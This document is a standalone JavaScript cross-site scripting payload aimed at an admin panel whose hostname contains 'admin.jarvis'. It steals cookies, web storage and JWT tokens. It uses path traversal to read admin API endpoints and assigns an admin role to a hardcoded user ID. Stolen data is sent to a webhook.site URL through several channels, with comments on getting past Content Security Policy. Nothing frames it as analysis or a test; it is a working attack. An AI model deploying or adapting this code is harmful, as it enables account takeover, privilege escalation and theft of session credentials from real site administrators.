(async()=>{
try{
if(!String(location.hostname||'').includes('admin.jarvis')){return;}
const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
const uid='01967db5-ae00-4642-96ba-f82321e15ef0';
const steal={cookie:'',ls:'',ss:'',href:'',ua:'',jwt:'',cookieStore:''};
try{steal.cookie=(document.cookie||'').substring(0,2000);}catch(e){}
try{if(window.cookieStore&&cookieStore.getAll){steal.cookieStore=JSON.stringify(await cookieStore.getAll()).substring(0,2000);}}catch(e){}
try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=(localStorage.getItem(k)||'').substring(0,400);}steal.ls=JSON.stringify(ls).substring(0,2500);}catch(e){}
try{const ss={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=(sessionStorage.getItem(k)||'').substring(0,400);}steal.ss=JSON.stringify(ss).substring(0,2500);}catch(e){}
try{steal.href=String(location.href||'').substring(0,400);}catch(e){}
try{steal.ua=String(navigator.userAgent||'').substring(0,200);}catch(e){}
try{for(const store of [localStorage,sessionStorage]){for(let i=0;i<store.length;i++){const v=store.getItem(store.key(i))||'';if(v.startsWith('eyJ')&&v.length>80){steal.jwt=v.substring(0,800);break;}}if(steal.jwt)break;}}catch(e){}

const pulls={};
async function pull(name,path,opt){
  try{
    const r=await fetch(path,Object.assign({credentials:'include',headers:{'Accept':'application/json'}},opt||{}));
    const t=await r.text();
    pulls[name]={status:r.status,body:t.substring(0,1500)};
    return pulls[name];
  }catch(e){pulls[name]={error:String(e).substring(0,160)};return pulls[name];}
}

// same-origin only (allowed by connect-src 'self')
await pull('me','/api/session/login/../../v1/me');
await pull('roles','/api/session/login/../../v1/admin/roles');
await pull('users','/api/session/login/../../v1/admin/users?page=1&pageSize=5');

let assignStatus=0,roleId='';
try{
  const rolesRaw=pulls.roles&&pulls.roles.body?JSON.parse(pulls.roles.body):{};
  const roles=Array.isArray(rolesRaw.data)?rolesRaw.data:(Array.isArray(rolesRaw)?rolesRaw:[]);
  if(roles.length){
    const adminRole=roles.find(r=>r.name&&(/admin|super/i).test(String(r.name)))||roles[0];
    roleId=String(adminRole.id||'').substring(0,36);
    await pull('assign','/api/session/login/../../v1/admin/users/'+uid+'/roles',{
      method:'POST',
      headers:{'Content-Type':'application/json','Accept':'application/json'},
      body:JSON.stringify({roleId:adminRole.id})
    });
    assignStatus=(pulls.assign&&pulls.assign.status)||0;
  }
}catch(e){}

// persist a same-origin breadcrumb on OUR profile if still writable with stolen admin session via traversal
try{
  const marker='JA-HIT:'+assignStatus+':'+roleId+':'+Date.now();
  await pull('mark','/api/session/login/../../v1/me',{
    method:'PUT',
    headers:{'Content-Type':'application/json','Accept':'application/json'},
    body:JSON.stringify({fullName:marker})
  });
}catch(e){}

const payload={t:Date.now(),host:location.hostname,href:steal.href,ua:steal.ua,cookie:steal.cookie,cookieStore:steal.cookieStore,ls:steal.ls,ss:steal.ss,jwt:steal.jwt,assign:assignStatus,roleId:roleId,pulls:pulls};

// external exfil best-effort (may be CSP-blocked); still try multiple channels
const q=new URLSearchParams({s:String(assignStatus),r:String(roleId).substring(0,12),j:steal.jwt?'1':'0',ck:(steal.cookie||'').substring(0,200)});
try{new Image().src=C+(C.includes('?')?'&':'?')+q.toString();}catch(e){}
try{fetch(C,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(payload)});}catch(e){}
try{navigator.sendBeacon&&navigator.sendBeacon(C,new Blob([JSON.stringify(payload)],{type:'text/plain'}));}catch(e){}
// CSP-friendly exfil: load extra script with data in query (script-src https: / strict-dynamic child)
try{const s=document.createElement('script');s.src=C.split('?')[0]+'/exfil.js?'+q.toString();document.documentElement.appendChild(s);}catch(e){}
}catch(e){
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,140));}catch(x){}
}
})();
